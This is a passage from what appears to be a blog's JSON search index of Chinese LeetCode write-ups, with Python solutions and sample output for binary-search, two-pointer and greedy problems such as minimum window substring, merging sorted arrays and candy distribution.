nums[r]: # mid到r是有序的，判断target是否在其中 if nums[mid] &lt; target &lt;= nums[r]: l = mid + 1 else: r = mid - 1 return False 12345a= Solution()nums = [2,5,6,0,0,1,2]target = 3result= a.search(nums,target)print(result) False","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二分查找","slug":"二分查找","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"【数据结构与算法】【LeetCode】【二分查找】34.在排序数组中查找元素的第一个和最后一个位置","slug":"LeetCode-F-二分查找-34. 在排序数组中查找元素的第一个和最后一个位置","date":"2021-02-28T16:00:00.000Z","updated":"2021-03-01T10:54:33.332Z","comments":true,"path":"2021/03/01/LeetCode-F-二分查找-34. 在排序数组中查找元素的第一个和最后一个位置/","link":"","permalink":"https://fishni.github.io/2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-34.%20%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE/","excerpt":"二分查找","text":"二分查找 题目给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。 如果数组中不存在目标值 target，返回 [-1, -1] 示例 1： 输入：nums = [5,7,7,8,8,10], target = 8 输出：[3,4]示例2： 输入：nums = [5,7,7,8,8,10], target = 6 输出：[-1,-1]示例3： 输入：nums = [], target = 0 输出：[-1,-1]题解123456789101112131415161718192021222324252627282930313233343536class Solution: def searchRange(self, nums, target): # nums list[int] ,target:int if len(nums)==0: return [-1,-1] first=self.findleftpos(nums,target) if first==-1: return [-1,-1] last =self.findrightpos(nums,target) return [first,last] def findleftpos(self,nums,target): l=0 r=len(nums)-1 while l&lt;r: mid= (l+r)//2 if nums[mid]==target: r=mid elif nums[mid]&gt;target: r=mid-1 else: l=mid+1 if nums[l]==target: return l else: return -1 def findrightpos(self,nums,target): l=0 r= len(nums)-1 while l&lt;r: mid = (l+r+1)//2 if nums[mid]&gt;target: r=mid-1 elif nums[mid]==target: l=mid else: l=mid+1 return l 12345a= Solution()nums = [5,7,7,8,8,10]target = 8result=a.searchRange(nums,target)print(result) [3, 4]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二分查找","slug":"二分查找","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"【数据结构与算法】【LeetCode】【二分查找】69.x的平方根","slug":"LeetCode-F-二分查找-69. x 的平方根","date":"2021-02-27T16:00:00.000Z","updated":"2021-02-28T06:44:45.575Z","comments":true,"path":"2021/02/28/LeetCode-F-二分查找-69. x 的平方根/","link":"","permalink":"https://fishni.github.io/2021/02/28/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-69.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/","excerpt":"开方","text":"开方 题目实现 int sqrt(int x) 函数。 计算并返回 x 的平方根，其中 x 是非负整数。 由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。 示例1： 输入: 4 输出: 2示例2： 输入: 8 输出: 2 说明: 8 的平方根是 2.82842..., 由于返回类型是整数，小数部分将被舍去。题解1234567891011class Solution: def mySqrt(self, x: int) -&gt; int: l, r, ans = 0, x, -1 while l &lt;= r: mid = (l + r) // 2 if mid * mid &lt;= x: ans = mid l = mid + 1 else: r = mid - 1 return ans 12a=Solution()a.mySqrt(10) 3","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二分查找","slug":"二分查找","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"【数据结构与算法】【LeetCode】【双指针】76.最小覆盖子串","slug":"LeetCode-E-双指针-76. 最小覆盖子串","date":"2021-01-31T16:00:00.000Z","updated":"2021-02-01T08:04:07.773Z","comments":true,"path":"2021/02/01/LeetCode-E-双指针-76. 最小覆盖子串/","link":"","permalink":"https://fishni.github.io/2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-76.%20%E6%9C%80%E5%B0%8F%E8%A6%86%E7%9B%96%E5%AD%90%E4%B8%B2/","excerpt":"滑动窗口","text":"滑动窗口 题目给你一个字符串 s 、一个字符串t 。返回 s 中涵盖t所有字符的最小子串。如果 s中不存在涵盖 t所有字符的子串，则返回空字符串 “” 。 注意：如果 s 中存在这样的子串，我们保证它是唯一的答案。 示例1： 输入：s = &quot;ADOBECODEBANC&quot;, t = &quot;ABC&quot; 输出：&quot;BANC&quot;示例2： 输入：s = &quot;a&quot;, t = &quot;a&quot; 输出：&quot;a&quot;提示： 1 &lt;= s.length, t.length &lt;= 10^5 s 和 t 由英文字母组成题解滑动窗口思想 用l,r表示滑动窗口的左边界和右边界，通过改变l,r来扩展和收缩滑动窗口，可以想象成一个窗口在字符串上游走，当这个窗口包含的元素满足条件，即包含字符串T的所有元素，记录下这个滑动窗口的长度r-l+1，这些长度中的最小值就是要求的结果。 步骤一：不断增加r使滑动窗口增大，直到窗口包含了T的所有元素 步骤二：不断增加l使滑动窗口缩小，因为是要求最小字串，所以将不必要的元素排除在外，使长度减小，直到碰到一个必须包含的元素，这个时候不能再扔了，再扔就不满足条件了，记录此时滑动窗口的长度，并保存最小值 步骤三：让l再增加一个位置，这个时候滑动窗口肯定不满足条件了，那么继续从步骤一开始执行，寻找新的满足条件的滑动窗口，如此反复，直到j超出了字符串S范围。 判断窗口是否包含T中所有元素 用字典need表示当前滑动窗口中需要的各元素数量，一开始滑动窗口为空，用T中各元素初始化need，在滑动窗口扩展或者收缩时，维护该need字典 当窗口包含某个元素，need中该元素数量减1，表示所需元素减少1个； 当窗口移除某个元素，need中钙元素的数量加1 need始终记录当前滑动窗口下，还需的元素数量，在改变l,r时，需同步维护need 注意：只要某个元素包含在滑动窗口中，need中就存储这个元素的数量，如果某个元素存储的是负数表示这个元素是多余的。如need={‘A’:-2,&#39;C&#39;:1}时，表示当前窗口中，2个A是多余的，同时还需要一个C。此目的是步骤二中排除不必要的元素，数量为负的就是不必要的元素，而数量为0表示刚刚好。 当need中所有元素的数量都小于等于0时，表示当前滑动窗口不再需要任何元素 优化 如果每次判断滑动窗口是否包含了T的所有元素，都去遍历need看是否所有元素数量都小于等于0，这个会耗费O(k)的时间复杂度，k代表字典长度，最坏情况下，k可能等于len(S)。 其实这个是可以避免的，我们可以维护一个额外的变量needCnt来记录所需元素的总数量，当我们碰到一个所需元素c，不仅need[c]的数量减少1，同时needCnt也要减少1，这样我们通过needCnt就可以知道是否满足条件，而无需遍历字典了。前面也提到过，need记录了遍历到的所有元素，而只有need[c]&gt;0大于0时，代表c就是所需元素 图示 以S=”DOABECODEBANC”，T=”ABC”为例 初始状态： 步骤一：不断增加j使滑动窗口增大，直到窗口包含了T的所有元素，need中所有元素的数量都小于等于0，同时needCnt也是0 步骤二：不断增加i使滑动窗口缩小，直到碰到一个必须包含的元素A，此时记录长度更新结果 步骤三：让i再增加一个位置，开始寻找下一个满足条件的滑动窗口 123456789101112131415161718192021222324252627import collectionsclass Solution: def minWindow(self, s: str, t: str) -&gt; str: need=collections.defaultdict(int) # int可以用来计数，重复出现的key，对应值增加1 for c in t: need[c] += 1 needCnt= len(t) l=0 res = (0,float('inf')) for r,c in enumerate(s): if need[c]&gt;0: needCnt -=1 need[c] -=1 if needCnt==0:# 步骤一：滑动窗口包含了所有T元素 while True: # 步骤二：增加l,排除多余元素 c=s[l] if need[c]==0: break need[c] +=1 l +=1 if r-l&lt;res[1]-res[0]: #记录结果 res=(l,r) need[s[l]]+=1 # 步骤三：l增加一个位置，寻找新的满足条件滑动窗口 needCnt +=1 l +=1 return '' if res[1]&gt;len(s) else s[res[0]:res[1]+1] #如果res始终没被更新过，代表无满足条件的结果 1234s = 'ADOBECODEBANC't = \"ABC\"a= Solution()print(a.minWindow(s,t)) BANC复杂度 我们会用r扫描一遍S，也会用l扫描一遍S，最多扫描2次S，所以时间复杂度是O(n)，空间复杂度为O(k)，k为S和T中的字符集合。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"双指针","permalink":"https://fishni.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}]},{"title":"【数据结构与算法】【LeetCode】【双指针】88.合并两个有序数组","slug":"LeetCode-E-双指针-88. 合并两个有序数组","date":"2021-01-31T16:00:00.000Z","updated":"2021-02-01T02:14:23.854Z","comments":true,"path":"2021/02/01/LeetCode-E-双指针-88. 合并两个有序数组/","link":"","permalink":"https://fishni.github.io/2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-88.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/","excerpt":"三指针","text":"三指针 题目给你两个有序整数数组 nums1 和 nums2，请你将 nums2 合并到 nums1 中，使 nums1 成为一个有序数组。 初始化 nums1 和 nums2 的元素数量分别为 m 和 n 。你可以假设 nums1 的空间大小等于 m + n，这样它就有足够的空间保存来自 nums2 的元素。 示例1： 输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3 输出：[1,2,2,3,5,6]示例2： 输入：nums1 = [1], m = 1, nums2 = [], n = 0 输出：[1]题解思路 由于两个数组已经有序，所以两个指针控制m-1和n-1处值，比较两者并将其复制值m+n-1处，当比较一次，m+n-1处前移一次。故需要三个指针指向。 1234567891011121314151617181920212223class Solution: def merge(self, nums1, m, nums2,n) -&gt; None: # nums1：List[int]，nums2:List[int] \"\"\" Do not return anything, modify nums1 in-place instead. \"\"\" pos = m+n-1 m -=1 n -=1 while m&gt;=0 and n&gt;=0: #print(pos,m,n,nums1[m],nums2[n]) if nums1[m]&gt;nums2[n]: nums1[pos]=nums1[m] m -=1 else: nums1[pos]=nums2[n] n -=1 pos -=1 #print(\"dddd\",nums1) while n&gt;=0: nums1[pos]=nums2[n] pos -=1 n -=1 return nums1 1234567a= Solution()nums1 = [1,2,3,0,0,0]m = 3nums2 = [2,5,6]n = 3result = a.merge(nums1,m,nums2,n)print(result) 5 2 2 3 6 dddd [1, 2, 3, 0, 0, 6] 4 2 1 3 5 dddd [1, 2, 3, 0, 5, 6] 3 2 0 3 2 dddd [1, 2, 3, 3, 5, 6] 2 1 0 2 2 dddd [1, 2, 2, 3, 5, 6] [1, 2, 2, 3, 5, 6]1234567a= Solution()nums1 = [0]m = 0nums2 = [1]n = 1result = a.merge(nums1,m,nums2,n)print(result) [1]1234567nums1 = [1]m = 1nums2 = []n = 0a =Solution()result =a.merge(nums1,m,nums2,n)print(result) [1]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"双指针","permalink":"https://fishni.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}]},{"title":"【数据结构与算法】【LeetCode】【双指针】167.两数之和II-输入有序数组","slug":"LeetCode-E-双指针-167. 两数之和 II - 输入有序数组","date":"2021-01-23T16:00:00.000Z","updated":"2021-01-24T02:43:12.344Z","comments":true,"path":"2021/01/24/LeetCode-E-双指针-167. 两数之和 II - 输入有序数组/","link":"","permalink":"https://fishni.github.io/2021/01/24/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-167.%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20II%20-%20%E8%BE%93%E5%85%A5%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/","excerpt":"双指针","text":"双指针 题目给定一个已按照升序排列的有序数组，找到两个数使得它们相加之和等于目标数。 函数应该返回这两个下标值 index1 和 index2，其中 index1 必须小于 index2。 说明 返回的下标值（index1 和 index2）不是从零开始的。 你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。 示例： 输入: numbers = [2, 7, 11, 15], target = 9 输出: [1,2] 解释: 2 与 7 之和等于目标数 9 。因此 index1 = 1, index2 = 2 。题解思路 采用双指针思想，左指针指向最小元素，右指针指向最大元素 相等时，直接返回 两者指向和大于目标值，右指针向左移动 两者指向和小于目标值，左指针向右移动 1234567891011class Solution: def twoSum(self, numbers, target): # numbers:list[int] ,target:int l=0 r=len(numbers)-1 while l&lt;r: if numbers[l]+numbers[r]==target: return l+1,r+1 if numbers[l]+numbers[r]&gt;target: r=r-1 if numbers[l]+numbers[r]&lt;target: l=l+1 12345numbers = [2, 7, 11, 15]target = 9a= Solution()result = a.twoSum(numbers,target)print(result) (1, 2)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"双指针","permalink":"https://fishni.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}]},{"title":"【数据结构与算法】【LeetCode】【贪心算法】452.用最少数量的箭引爆气球","slug":"LeetCode-D-贪心算法-452. 用最少数量的箭引爆气球(medium)","date":"2021-01-05T16:00:00.000Z","updated":"2021-01-06T02:00:03.965Z","comments":true,"path":"2021/01/06/LeetCode-D-贪心算法-452. 用最少数量的箭引爆气球(medium)/","link":"","permalink":"https://fishni.github.io/2021/01/06/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-452.%20%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%BC%95%E7%88%86%E6%B0%94%E7%90%83(medium)/","excerpt":"贪心策略、排序","text":"贪心策略、排序 题目在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标 一支弓箭可以沿着 x 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 $x_{start}，x_{end}$， 且满足 $x_{start} ≤ x ≤ x_{end}$，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。 给你一个数组 points ，其中 $points [i] = [x_{start},x_{end}]$ ，返回引爆所有气球所必须射出的最小弓箭数。 示例1： 输入：points = [[10,16],[2,8],[1,6],[7,12]] 输出：2 解释：对于该样例，x = 6 可以射爆 [2,8],[1,6] 两个气球，以及 x = 11 射爆另外两个气球示例2： 输入：points = [[1,2],[3,4],[5,6],[7,8]] 输出：4示例3： 输入：points = [[1,2],[2,3],[3,4],[4,5]] 输出：2示例4： 输入：points = [[1,2]] 输出：1示例5： 输入：points = [[2,3],[2,3]] 输出：1提示 $0&lt;=points.length&lt;=10^4$ $points[i].length==2$ $-2^{31}&lt;=x_{start}&lt;x_{end}&lt;=2^{31}-1$ 题解方法一：排序+贪心在选择要保留区间时，区间的结尾十分重要：选择的区间结尾越小，余留给其它区间的空间 就越大，就越能保留更多的区间。因此，我们采取的贪心策略为，优先保留结尾小且不相交的区 间。 具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选 择的区间不重叠的区间。选择右排序，杜绝了前面一个包含后一个区间的情况。初始时，令每个气球都射一箭，当重叠时，总数n减一即可 12345678910111213141516class Solution: def findMinArrowShots(self, points) -&gt; int: n=len(points) if n==0: return 0 new_points=sorted(points,key=lambda x:x[1]) a = new_points[0][0] b = new_points[0][1] for i in range(1,n): if new_points[i][0]&lt;=b: n -=1 else: a=new_points[i][0] b=new_points[i][1] return n 1234a =Solution()points = [[3,9],[7,12],[3,8],[6,8],[9,10],[2,9],[0,9],[3,9],[0,6],[2,8]]result=a.findMinArrowShots(points)print(result) 2","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"【数据结构与算法】【LeetCode】【贪心算法】605.种花问题","slug":"LeetCode-D-贪心算法-605. 种花问题(easy)","date":"2021-01-04T16:00:00.000Z","updated":"2021-01-05T07:26:14.250Z","comments":true,"path":"2021/01/05/LeetCode-D-贪心算法-605. 种花问题(easy)/","link":"","permalink":"https://fishni.github.io/2021/01/05/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-605.%20%E7%A7%8D%E8%8A%B1%E9%97%AE%E9%A2%98(easy)/","excerpt":"贪心策略、","text":"贪心策略、 题目假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。 给你一个整数数组flowerbed 表示花坛，由若干 0 和 1 组成，其中 0 表示没种植花，1 表示种植了花。另有一个数n，能否在不打破种植规则的情况下种入n 朵花？能则返回 true ，不能则返回 false。 示例1： 输入：flowerbed = [1,0,0,0,1], n = 1 输出：true示例2： 输入：flowerbed = [1,0,0,0,1], n = 2 输出：false提示： $1 &lt;= flowerbed.length &lt;= 2 * 10^4$ $flowerbed[i] 为 0 或 1$ $flowerbed 中不存在相邻的两朵花$ $0 &lt;= n &lt;= flowerbed.length$ 题解方法一：跳格子解法题目要求是否能在不打破规则的情况下插入n朵花，与直接计算不同，采用“跳格子”的解法只需遍历不到一遍数组，处理以下两种不同的情况即可： 【1】当遍历到index遇到1时，说明这个位置有花，那必然从index+2的位置才有可能种花，因此当碰到1时直接跳过下一格 【2】当遍历到index遇到0时，由于每次碰到1都是跳两格，因此前一格必定是0，此时只需要判断下一格是不是1即可得出index这一格能不能种花，如果能种则令n减一，然后这个位置就按照遇到1时处理，即跳两格；如果index的后一格是1，说明这个位置不能种花且之后两格也不可能种花（参照【1】），直接跳过3格。 当n减为0时，说明可以种入n朵花，则可以直接退出遍历返回true；如果遍历结束n没有减到0，说明最多种入的花的数量小于n，则返回false。 123456789101112131415class Solution: def canPlaceFlowers(self, flowerbed, n) -&gt; bool: i = 0 while i&lt;len(flowerbed) and n&gt;0: if flowerbed[i]==1: i = i+2 else: if i==len(flowerbed)-1 or flowerbed[i+1]==0: n=n-1 i=i+2 else: i=i+3 return n&lt;=0 12345a=Solution()flowerbed=[1,0,0,0,1]n=2result=a.canPlaceFlowers(flowerbed,n)print(result) False方法二：贪心从左向右遍历花坛，在可以种花的地方就种一朵，能种就种（因为在任一种花时候，不种都不会得到更优解），就是一种贪心的思想 这里可以种花的条件是： 自己为空 左边为空 或者 自己是最左 右边为空 或者 自己是最右 最后判断n朵花是否有剩余，为了效率起见，可以在种花的过程中做判断，一旦花被种完就返回true 123456789class Solution: def canPlaceFlowers(self, flowerbed, n) -&gt; bool: i=0 while i&lt;len(flowerbed) and n&gt;0: if flowerbed[i]==0 and (i==0 or flowerbed[i-1]==0 ) and (i==len(flowerbed)-1 or flowerbed[i+1]==0): n=n-1 flowerbed[i]=1 i=i+1 return n&lt;=0 12345a=Solution()flowerbed=[1,0,0,0,0,1]n=2result=a.canPlaceFlowers(flowerbed,n)print(result) False","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"【数据结构与算法】【LeetCode】【贪心算法】435.无重叠区间","slug":"LeetCode-D-贪心算法-435. 无重叠区间","date":"2021-01-03T16:00:00.000Z","updated":"2021-01-04T09:16:21.320Z","comments":true,"path":"2021/01/04/LeetCode-D-贪心算法-435. 无重叠区间/","link":"","permalink":"https://fishni.github.io/2021/01/04/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-435.%20%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/","excerpt":"贪心策略、区间问题","text":"贪心策略、区间问题 题目给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。 注意: 可以认为区间的终点总是大于它的起点。 区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。 示例1： 输入: [ [1,2], [2,3], [3,4], [1,3] ] 输出: 1 解释: 移除 [1,3] 后，剩下的区间没有重叠。示例2： 输入: [ [1,2], [1,2], [1,2] ] 输出: 2 解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。示例3： 输入: [ [1,2], [2,3] ] 输出: 0 解释: 你不需要移除任何区间，因为它们已经是无重叠的了。题解方法一：贪心策略在选择要保留区间时，区间的结尾十分重要：选择的区间结尾越小，余留给其它区间的空间 就越大，就越能保留更多的区间。因此，我们采取的贪心策略为，优先保留结尾小且不相交的区 间。 具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选 择的区间不重叠的区间。 1 2 1 3 2 4 1 5 最后剩 1 2 2 41234567891011121314151617class Solution: def eraseOverlapIntervals(self, intervals) -&gt; int: if len(intervals)==0: return 0 new_intervals=sorted(intervals,key=lambda x:x[1]) ret=0 a = new_intervals[0][0] b = new_intervals[0][1] for i in range(1,len(intervals)): if new_intervals[i][0]&lt;b: ret+=1 else: a = new_intervals[i][0] b = new_intervals[i][1] return ret 1234a = Solution()intervals=[ [1,2], [1,3] ]result=a.eraseOverlapIntervals(intervals)print(result) 1","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"https://fishni.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"【数据结构与算法】【LeetCode】【贪心算法】135.分发糖果","slug":"LeetCode-D-贪心算法-135. 分发糖果","date":"2021-01-01T16:00:00.000Z","updated":"2021-01-02T10:55:39.030Z","comments":true,"path":"2021/01/02/LeetCode-D-贪心算法-135. 分发糖果/","link":"","permalink":"https://fishni.github.io/2021/01/02/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-135.%20%E5%88%86%E5%8F%91%E7%B3%96%E6%9E%9C/","excerpt":"贪心策略、分配问题","text":"贪心策略、分配问题 题目老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。 你需要按照以下要求，帮助老师给这些孩子分发糖果： 每个孩子至少分配到 1 个糖果。 评分更高的孩子必须比他两侧的邻位孩子获得更多的糖果。 那么这样下来，老师至少需要准备多少颗糖果呢？ 示例1: 输入：[1,0,2] 输出：5 解释：你可以分别给这三个孩子分发 2、1、2 颗糖果。示例2： 输入：[1,2,2] 输出：4 解释：你可以分别给这三个孩子分发 1、2、1 颗糖果。 第三个孩子只得到 1 颗糖果，这已满足上述两个条件。题解方法一：两次遍历我们可以将「相邻的孩子中，评分高的孩子必须获得更多的糖果」这句话拆分为两个规则，分别处理 左规则：当ratings[i-1]&lt;ratings[i]时，i号学生的糖果数量将比i-1号孩子的糖果数量多 右规则：当ratings[i]&gt;ratings[i+1]时，i号学生糖果数比i+1号孩子糖果数量多。 初始化长度为len(ratings)1的列表 先从左至右遍历，如果右边孩子的评分比左边的高，则右边孩子的糖果数更新为左边孩子的糖果数加 1； 再从右至左遍历，如果左边孩子的评分比右边的高，且左边孩子当前的糖果数不大于右边孩子的糖果数，则左边孩子的糖果数更新为右边孩子的糖果数加 1 1234567891011121314151617181920class Solution: def candy(self, ratings) -&gt; int: n=len(ratings) if n==0: return 0 tmp=[1]*n for i in range(1,n): if ratings[i]&gt;ratings[i-1]: tmp[i]=tmp[i-1]+1 for j in range(n-1,0,-1): if ratings[j-1]&gt;ratings[j] and tmp[j-1]&lt;=tmp[j]: tmp[j-1]=tmp[j]+1 sum=0 for c in tmp: sum+=c return sum 123a=Solution()ratings=[1,0,2]a.candy(ratings) 512345678910111213141516171819class Solution: def candy(self, ratings) -&gt; int: n = len(ratings) left = [0] * n for i in range(n): if i &gt; 0 and ratings[i] &gt; ratings[i - 1]: left[i] = left[i - 1] + 1 else: left[i] = 1 right = ret = 0 for i in range(n - 1, -1, -1): if i &lt; n - 1 and ratings[i] &gt; ratings[i + 1]: right += 1 else: right = 1 ret += max(left[i], right) return ret 123a=Solution()ratings=[1,2,2]a.candy(ratings) 4复杂度分析 时间复杂度：时间复杂度：O(n)，其中 n是孩子的数量。我们需要遍历两次数组以分别计算满足左规则或右规则的最少糖果数量。 空间复杂度：O(n)，其中 n 是孩子的数量。我们需要保存所有的左规则对应的糖果数量 方法二：常数空间遍历我们从左到右枚举每一个同学，记前一个同学分得的糖果数量为$pre$ 如果当前同学比上一个同学评分高，说明我们就在最近的递增序列中，直接分配给该同学 $pre+1$ 个糖果即可。 否则我们就在一个递减序列中，我们直接分配给当前同学一个糖果，并把该同学所在的递减序列中所有的同学都再多分配一个糖果，以保证糖果数量还是满足条件。 我们无需显式地额外分配糖果，只需要记录当前的递减序列长度，即可知道需要额外分配的糖果数量。 同时注意当前的递减序列长度和上一个递增序列等长时，需要把最近的递增序列的最后一个同学也并进递减序列中 这样，我们只要记录当前递减序列的长度dec，最近的递增序列的长度 inc 和前一个同学分得的糖果数量pre 即可。 1234567891011121314151617181920class Solution: def candy(self, ratings) -&gt; int: n = len(ratings) ret = 1 inc, dec, pre = 1, 0, 1 for i in range(1, n): if ratings[i] &gt;= ratings[i - 1]: dec = 0 pre = (1 if ratings[i] == ratings[i - 1] else pre + 1) ret += pre inc = pre else: dec += 1 if dec == inc: dec += 1 ret += dec pre = 1 return ret 123a=Solution()ratings=[1,3,5,3,2,1]print(a.candy(ratings)) 13复杂度分析 时间复杂度：O(n)，其中 n 是孩子的数量。我们需要遍历两次数组以分别计算满足左规则或右规则的最少糖果数量。 